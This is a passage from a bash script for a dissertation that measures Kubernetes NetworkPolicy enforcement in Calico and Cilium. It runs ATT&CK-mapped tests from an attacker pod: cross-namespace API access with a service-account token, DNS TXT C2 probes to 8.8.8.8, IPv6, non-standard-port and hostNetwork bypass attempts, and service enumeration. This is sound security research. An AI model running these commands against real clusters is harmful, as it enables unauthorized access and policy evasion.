        "BLOCKED" "169.254.169.254 unreachable — metadata endpoint not accessible (expected in KIND/bare-metal)"
    fi
  fi

  # ===========================================================================
  # TEST 24 — T1078 | Persistence: Valid Accounts (cross-namespace API access)
  # Use the default namespace SA token to query kube-system namespace.
  # Tests whether NetworkPolicy and RBAC together prevent cross-namespace access.
  # ===========================================================================
  log "--- T1078 | Persistence: Valid Accounts (cross-namespace API access) ---"
  if [[ -n "$SA_TOKEN" ]]; then
    KUBE_SYS=$(exec_attack "curl -sk -H 'Authorization: Bearer ${SA_TOKEN}' \
      https://kubernetes.default.svc.cluster.local/api/v1/namespaces/kube-system/pods" \
      2>/dev/null || echo "")
    if echo "$KUBE_SYS" | grep -q '"items"'; then
      record_result "T1078" "Valid Accounts — Cross-Namespace API Access" "Persistence" \
        "ALLOWED" "kube-system pod list returned using default namespace SA token — RBAC allows cross-namespace read"
    elif echo "$KUBE_SYS" | grep -q '"Forbidden"\|403'; then
      record_result "T1078" "Valid Accounts — Cross-Namespace API Access" "Persistence" \
        "BLOCKED" "kube-system access denied (HTTP 403) — RBAC correctly scoped to single namespace"
    else
      record_result "T1078" "Valid Accounts — Cross-Namespace API Access" "Persistence" \
        "BLOCKED" "API server unreachable for cross-namespace query — NetworkPolicy blocking API access"
    fi
  else
    record_result "T1078" "Valid Accounts — Cross-Namespace API Access" "Persistence" \
      "ERROR" "No SA token available for cross-namespace test"
  fi

  # ===========================================================================
  # TEST 25 — T1071.004 | Command and Control: DNS as Application Layer Protocol
  # Use DNS TXT record queries as a covert C2 channel.
  # Tests whether the CNI/policy restricts DNS query types beyond A records.
  # Standard egress allow rules permit UDP 53 for A records — TXT queries for
  # arbitrary domains are the DNS tunneling technique (e.g. iodine, dnscat2).
  # ===========================================================================
  log "--- T1071.004 | Command and Control: DNS as Application Layer Protocol ---"
  # Test A record — expected to work if DNS is allowed at all
  A_RECORD=$(exec_attack "dig +short +timeout=3 A frontend.${NAMESPACE}.svc.cluster.local @10.96.0.10 2>/dev/null | head -1" 2>/dev/null || echo "")
  # Test TXT record to external domain — this is the C2 channel test
  TXT_RECORD=$(exec_attack "dig +short +timeout=3 TXT version.bind @8.8.8.8 2>/dev/null | head -1" 2>/dev/null || echo "")
  # Test DNS over non-standard port (5353 mDNS port used by some tunnels)
  ALT_DNS=$(exec_attack "nc -u -z -w2 8.8.8.8 5353 2>&1" 2>/dev/null || echo "")

  if [[ -n "$TXT_RECORD" ]] && echo "$TXT_RECORD" | grep -qv "^$"; then
    record_result "T1071.004" "DNS as Application Layer Protocol (TXT/C2)" "Command and Control" \
      "ALLOWED" "External TXT query reached 8.8.8.8 — DNS tunneling C2 channel viable. TXT response: ${TXT_RECORD:0:60}. Egress DNS not restricted by query type"
  elif [[ -n "$A_RECORD" ]]; then
    record_result "T1071.004" "DNS as Application Layer Protocol (TXT/C2)" "Command and Control" \
      "ALLOWED" "Internal DNS works (A record resolved) but external TXT queries timed out. Partial DNS egress restriction. Internal A: ${A_RECORD}"
  else
    record_result "T1071.004" "DNS as Application Layer Protocol (TXT/C2)" "Command and Control" \
      "BLOCKED" "Both internal DNS and external TXT queries failed — DNS egress fully blocked (WARNING: this breaks legitimate cluster DNS too)"
  fi
}

# =============================================================================
# PHASE 1: BASELINE — run all 25 tests with zero policies
# =============================================================================
run_phase1() {
  log "============================================================"
  log " PHASE 1: BASELINE ATTACK TESTING (Zero NetworkPolicies)"
  log " Tests 1-25 | Expected: ALL = ALLOWED"
  log " Any BLOCKED in Phase 1 = RBAC (not CNI) — document separately"
  log "============================================================"
  log ""

  POLICY_COUNT=$(kubectl get networkpolicies -A --context "$CTX" \
    --no-headers 2>/dev/null | wc -l | tr -d ' ')
  log "[VERIFY] NetworkPolicy count: ${POLICY_COUNT} (should be 0)"
  if [[ "$POLICY_COUNT" -gt 0 ]]; then
    log "[WARNING] Policies exist — Phase 1 baseline may be invalid"
  fi
  log ""

  run_all_tests
}

# =============================================================================
# PHASE 2: ENFORCEMENT — run all 25 tests after default-deny applied
# =============================================================================
run_phase2() {
  log "============================================================"
  log " PHASE 2: POLICY ENFORCEMENT TESTING (Default-Deny Applied)"
  log " Tests 1-25 | Expected: Network attacks = BLOCKED"
  log " ALLOWED result = enforcement gap = dissertation finding"
  log " NOTE: T1040/T1049/T1083 will remain ALLOWED — filesystem reads"
  log "       are outside CNI scope. Document this as expected behaviour."
  log "============================================================"
  log ""

  POLICY_COUNT=$(kubectl get networkpolicies -A --context "$CTX" \
    --no-headers 2>/dev/null | wc -l | tr -d ' ')
  log "[VERIFY] NetworkPolicy count: ${POLICY_COUNT} (should be > 0)"
  if [[ "$POLICY_COUNT" -eq 0 ]]; then
    log "[WARNING] NO NetworkPolicies found — apply default-deny before Phase 2"
    log "          kubectl apply -f default-deny.yaml --context ${CTX}"
  fi
  log ""

  run_all_tests
}

# =============================================================================
# PHASE 3: CNI BYPASS ATTEMPTS — 4 bypass techniques (B1-B4)
# These specifically test where Calico (iptables) and Cilium (eBPF) differ
# =============================================================================
run_phase3() {
  log "============================================================"
  log " PHASE 3: CNI BYPASS ATTEMPTS (4 techniques)"
  log " ALLOWED result here = significant dissertation finding"
  log " These tests expose architectural differences between CNIs"
  log "============================================================"
  log ""

  POLICY_COUNT=$(kubectl get networkpolicies -A --context "$CTX" \
    --no-headers 2>/dev/null | wc -l | tr -d ' ')
  log "[VERIFY] NetworkPolicy count: ${POLICY_COUNT} (must be > 0 for bypass tests to be meaningful)"
  log ""

  # --- BYPASS 1: IPv6 Gap (T1599) -------------------------------------------
  log "--- BYPASS-1 | T1599 | IPv6 Enforcement Gap ---"
  log "    Calico: iptables rules apply to IPv4 only by default"
  log "    Cilium: eBPF enforces both IPv4 and IPv6 natively"
  REDIS_POD=$(kubectl get pods -n "$NAMESPACE" --context "$CTX" \
    --no-headers 2>/dev/null | grep "redis-cart" | awk '{print $1}' | head -1)
  REDIS_IPV6=$(kubectl get pod "$REDIS_POD" -n "$NAMESPACE" --context "$CTX" \
    -o jsonpath='{.status.podIPs[1].ip}' 2>/dev/null || echo "")
  if [[ -z "$REDIS_IPV6" ]] || [[ "$REDIS_IPV6" != *":"* ]]; then
    record_result "T1599" "IPv6 Enforcement Gap Bypass" "Defense Evasion" \
      "ERROR" "No IPv6 pod IPs on this cluster — IPv6 not enabled in KIND config"
  else
    if exec_attack "nc -6 -z -w3 ${REDIS_IPV6} 6379" 2>/dev/null; then
      record_result "T1599" "IPv6 Enforcement Gap Bypass" "Defense Evasion" \
        "ALLOWED" "CONNECTED to redis-cart via IPv6 (${REDIS_IPV6}:6379) despite IPv4 default-deny — CNI BYPASS CONFIRMED. Calico iptables rules do not cover IPv6 traffic"
    else
      record_result "T1599" "IPv6 Enforcement Gap Bypass" "Defense Evasion" \
        "BLOCKED" "IPv6 connection to redis-cart also blocked — CNI enforces dual-stack policy correctly"
    fi
  fi

  # --- BYPASS 2: Non-Standard Port (T1571) -----------------------------------
  log ""
  log "--- BYPASS-2 | T1571 | Non-Standard Port Bypass ---"
  log "    NetworkPolicies specify exact ports. Any unlisted port may be open."
  log "    Calico: iptables only blocks declared ports"
  log "    Cilium: same — but eBPF handles this more efficiently"
  NS_BYPASS=0
  NS_OPEN_PORT=""
  for PORT in 8888 9999 4444 2222 31337 8443 3000; do
    if exec_attack "nc -z -w2 frontend.${NAMESPACE}.svc.cluster.local ${PORT}" 2>/dev/null; then
      NS_BYPASS=$((NS_BYPASS + 1))
      NS_OPEN_PORT="$PORT"
    fi
  done
  if [[ $NS_BYPASS -gt 0 ]]; then
    record_result "T1571" "Non-Standard Port Bypass" "Command and Control" \
      "ALLOWED" "${NS_BYPASS} non-standard port(s) reachable (e.g. port ${NS_OPEN_PORT}) — NetworkPolicy only blocks declared ports; unlisted ports depend on default-deny being applied"
  else
    record_result "T1571" "Non-Standard Port Bypass" "Command and Control" \
      "BLOCKED" "All non-standard ports blocked — default-deny correctly covers all unlisted ports"
  fi

  # --- BYPASS 3: hostNetwork Pod (T1611) -------------------------------------
  log ""
  log "--- BYPASS-3 | T1611 | hostNetwork Pod Bypass ---"
  log "    hostNetwork:true uses the node's network namespace"
  log "    NetworkPolicy applies to pod namespaces — not the host namespace"
  log "    This is a documented architectural limitation of Kubernetes NetworkPolicy"
  HN_POD="attacker-hostnet"
  kubectl delete pod "$HN_POD" -n "$NAMESPACE" --context "$CTX" \
    --ignore-not-found=true 2>/dev/null || true

  kubectl run "$HN_POD" \
    --image="$ATTACKER_IMAGE" \
    --restart=Never \
    --context "$CTX" \
    -n "$NAMESPACE" \
    --overrides='{
      "spec": {
        "hostNetwork": true,
        "containers": [{
          "name": "attacker-hostnet",
          "image": "nicolaka/netshoot",
          "command": ["sleep", "120"]
        }]
      }
    }' 2>/dev/null || true

  sleep 20
  HN_STATUS=$(kubectl get pod "$HN_POD" -n "$NAMESPACE" --context "$CTX" \
    --no-headers 2>/dev/null | awk '{print $3}' || echo "NotFound")

  if [[ "$HN_STATUS" == "Running" ]]; then
    HN_REDIS=$(kubectl exec "$HN_POD" -n "$NAMESPACE" --context "$CTX" \
      -- sh -c "nc -z -w3 redis-cart.${NAMESPACE}.svc.cluster.local 6379 && echo open || echo closed" \
      2>/dev/null || echo "closed")
    kubectl delete pod "$HN_POD" -n "$NAMESPACE" --context "$CTX" \
      --ignore-not-found=true 2>/dev/null || true
    if [[ "$HN_REDIS" == "open" ]]; then
      record_result "T1611" "hostNetwork Pod NetworkPolicy Bypass" "Privilege Escalation" \
        "ALLOWED" "hostNetwork pod reached redis-cart:6379 despite default-deny — NetworkPolicy DOES NOT apply to hostNetwork pods. This is an architectural bypass, not a CNI bug"
    else
      record_result "T1611" "hostNetwork Pod NetworkPolicy Bypass" "Privilege Escalation" \
        "BLOCKED" "hostNetwork pod also blocked from redis-cart — CNI enforcing node-level restrictions beyond NetworkPolicy spec"
    fi
  else
    kubectl delete pod "$HN_POD" -n "$NAMESPACE" --context "$CTX" \
      --ignore-not-found=true 2>/dev/null || true
    record_result "T1611" "hostNetwork Pod NetworkPolicy Bypass" "Privilege Escalation" \
      "ERROR" "hostNetwork pod failed to start (status: ${HN_STATUS}) — may require privileged admission or node has restrictions"
  fi

  # --- BYPASS 4: DNS Discovery Post-Deny (T1046) ----------------------------
  log ""
  log "--- BYPASS-4 | T1046 | DNS Service Discovery Post-Default-Deny ---"
  log "    Default-deny must explicitly allow UDP 53 to kube-dns or DNS breaks"
  log "    If DNS is allowed: attacker can still enumerate all service names/IPs"
  log "    If DNS is blocked: cluster loses all service discovery (broken cluster)"
  log "    Correct result: DNS ALLOWED (in policy), direct TCP BLOCKED"

  DNS_A=$(exec_attack "nslookup redis-cart.${NAMESPACE}.svc.cluster.local 2>&1" 2>/dev/null || echo "")
  DIRECT_TCP=$(exec_attack "nc -z -w3 redis-cart.${NAMESPACE}.svc.cluster.local 6379 2>/dev/null && echo open || echo closed" 2>/dev/null || echo "closed")

  if echo "$DNS_A" | grep -qiE "Address:|answer" && [[ "$DIRECT_TCP" == "open" ]]; then
    record_result "T1046" "DNS Discovery Post-Deny (both DNS and TCP open)" "Discovery" \
      "ALLOWED" "DNS resolved redis-cart AND TCP:6379 is open — NetworkPolicy not enforcing default-deny correctly"
  elif echo "$DNS_A" | grep -qiE "Address:|answer" && [[ "$DIRECT_TCP" == "closed" ]]; then
    record_result "T1046" "DNS Discovery Post-Deny (DNS open, TCP blocked)" "Discovery" \
      "ALLOWED" "DNS resolves redis-cart to IP (correct — DNS must be allowed) but TCP:6379 is blocked (correct). Attacker can still map service names to IPs via DNS. EXPECTED BEHAVIOUR for correctly configured default-deny"
  else
    record_result "T1046" "DNS Discovery Post-Deny (DNS also blocked)" "Discovery" \
      "BLOCKED" "DNS resolution also failed — default-deny blocking UDP 53. WARNING: this breaks cluster DNS for legitimate traffic too. Add explicit DNS allow rule to policy"
  fi
}

# =============================================================================
# SUMMARY
# =============================================================================
print_summary() {
  log ""
  log "============================================================"
  log " RESULTS SUMMARY"
  log "============================================================"
  log " Cluster  : ${CTX}"
  log " CNI      : ${CNI_NAME}"
  log " Phase    : ${PHASE}"
  log " Date     : $(date)"
  log "------------------------------------------------------------"
  log " Total Tests  : ${TOTAL}"
  log " ALLOWED      : ${ALLOWED}"
  log " BLOCKED      : ${BLOCKED}"
  log " ERRORS       : ${ERRORS}"
  log ""

  if [[ $TOTAL -gt 0 ]]; then
    if [[ "$PHASE" == "phase1" ]]; then
      RATE=$(awk "BEGIN {printf \"%.1f\", (${ALLOWED}/${TOTAL})*100}")
      log " Baseline Allow Rate : ${RATE}%"
      log " Note: BLOCKED results in Phase 1 are RBAC-enforced (not CNI)"
      log " Network-layer allow rate excludes RBAC-blocked API tests"
    else
      RATE=$(awk "BEGIN {printf \"%.1f\", (${BLOCKED}/${TOTAL})*100}")
      log " Enforcement Rate    : ${RATE}%"
      if (( $(echo "$RATE < 50" | bc -l 2>/dev/null || echo 0) )); then
        log " [CRITICAL] Below 50% — verify NetworkPolicy is applied"
      elif (( $(echo "$RATE < 80" | bc -l 2>/dev/null || echo 0) )); then
        log " [WARNING]  Below 80% — significant enforcement gaps remain"
      else
        log " [GOOD]     Strong enforcement detected"
      fi
      log ""
      log " NOTE: T1040/T1049/T1083 are filesystem reads — CNI cannot block"
      log " these by design. Exclude from enforcement rate calculation or"
      log " document as 'outside CNI scope' in your dissertation."
    fi
  fi

  log "------------------------------------------------------------"
  log " Report : ${REPORT_FILE}"
  log " CSV    : ${CSV_FILE}"
  log "============================================================"
}

# =============================================================================
# MAIN
# =============================================================================
log "============================================================"
log " DISSERTATION ATTACK TEST SUITE — 25 TECHNIQUES"
log " Student: Sagarkumar Bhaveshbhai Bhikadiya | ID: 24051080"
log " Cluster: ${CTX}"
log " CNI    : ${CNI_NAME}"
log " Phase  : ${PHASE}"
log " Time   : $(date)"
log "============================================================"

init_csv

# Pre-flight check
if ! kubectl get nodes --context "$CTX" --no-headers 2>/dev/null | grep -q "Ready"; then
  log "[FATAL] Cluster ${CTX} unreachable or no Ready nodes."
  log "        Run: kubectl get nodes --context ${CTX}"
  exit 1
fi
log "[OK] Cluster ${CTX} is reachable."
log ""

get_service_ips
log "[OK] Service IPs resolved."
log "     frontend=${FRONTEND_IP} | redis-cart=${REDIS_IP} | API=${API_SERVER_IP}"
log ""

deploy_attacker
log ""

case "$PHASE" in
  phase1) run_phase1 ;;
  phase2) run_phase2 ;;
  phase3) run_phase3 ;;
  *)
    log "[ERROR] Unknown phase: ${PHASE}. Use phase1, phase2, or phase3."
    exit 1
    ;;
esac

print_summary

log ""
log "Done."
log "  Report : ${REPORT_FILE}"
log "  CSV    : ${CSV_FILE}"
